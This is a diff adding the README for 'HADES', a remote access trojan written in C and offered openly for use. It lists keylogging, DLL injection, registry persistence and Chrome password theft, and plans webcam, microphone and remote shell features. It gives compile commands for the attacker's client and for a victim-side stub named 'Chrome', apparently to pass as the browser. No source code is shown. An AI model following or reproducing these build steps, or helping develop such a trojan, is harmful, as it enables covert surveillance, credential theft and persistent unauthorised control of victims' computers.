@@ -1,0 +1,66 @@
+#####################################################################################################
+                        ____    .-.	
+                     .-"`    `",( __\_
+      .-==:;-._    .'         .-.     `'.  _   _   ___ ______ _____ _____ 
+    .'      `"-:'-/          (  \} -=a  .)| | | | / _ \|  _  \  ___/  ___|
+   /            \/       \,== `-  __..-'` | |_| |/ /_\ \ | | | |__ \ `--. 
+'-'              |       |   |  .'\ `;    |  _  ||  _  | | | |  __| `--. \
+                  \    _/---'\ (   `"`    | | | || | | | |/ /| |___/\__/ /
+                 /.`._ )      \ `;        \_| |_/\_| |_/___/ \____/\____/
+                 \`-/.'        `"`	   ______________________________  
+                  `"\`-.                   [-]  Written by: _0verfl0w [-]
+                     `"`		   [-]  Remote Acc. Trojan    [-]
+					   [-]  Version: 1.00	      [-]
+
+
+---- THIS HAS ONLY BEEN TESTED ON A WINDOWS 7 COMPUTER. MAKE SURE YOU TEST BEFORE USING ----
+
+
+HADES is a Work In Progress Remote Administration Tool written in the C Programming Language. 
+Version 1.00 has the basic features in, however the code in incomplete and things such as 
+error handling has not been implemented fully, therefore you should not rely 100% on this version.
+
+HADES 1.00 offers the ability to upload files, download files, log keystrokes for a certain period 
+of time, retrieve basic system information such as the Public IP Address, inject a DLL into a
+running process, retrieve a list of running processes, view system time, add itself to the registry
+in order to create persistence, remove itself from the registry and dump all saved Chrome passwords
+using a Python Executable called "chromestealer".
+
+Please bear in mind that the code is INCOMPLETE and there is quite a bit missing from it. Hopefully 
+the next version will have much cleaner code, along with comments so you can fully understand each
+of the functions. Error handling will also be fully implemented in the next version. The code also 
+may not be amazing, as I am a beginner/intermediate when it comes to coding in C.
+
+Features to come in future updates (if possible):
+
+	[*] Asynchronous Keylogger
+	[*] ERROR HANDLING
+	[*] Firefox, IE Password dumps
+	[*] Webcam viewer
+	[*] Remote Microphone
+	[*] Remote Desktop
+	[*] Remote Shell
+	[*] Proper Uploading + Downloading Functions
+	[*] Geo Location Capabilities
+	[*] Built In Password Dumping (No Python Dependencies)
+	[*] Linux GUI
+	[*] Cross Platform
+
+#####################################################################################################
+
+Setting Up:
+
+In order to set up the attackers end, you will require the Linux OS along with GCC. In a terminal,
+type "gcc LinClient.c -o Hades" and it will compile for you. Then type "./Hades" and hit enter.
+
+To set up the victims end, you will require a Windows Computer with GCC installed, so that you can
+compile the stub. In the command prompt, type in "gcc WinServer.c -o Chrome -lws2_32 -lwsock32",
+where WinServer.c is the name of the C file and Chrome is the name of the EXE that will be compiled.
+
+To compile the chromestealer.py file, you will require a Windows Computer with PyInstaller and Python
+2.7 installed. In a command prompt, type in "pyinstaller chromestealer.py --onefile". Please bear in
+mind that you must call the EXE file chromestealer.exe, otherwise you will have to edit the WinServer
+source code.
+
+#####################################################################################################
+
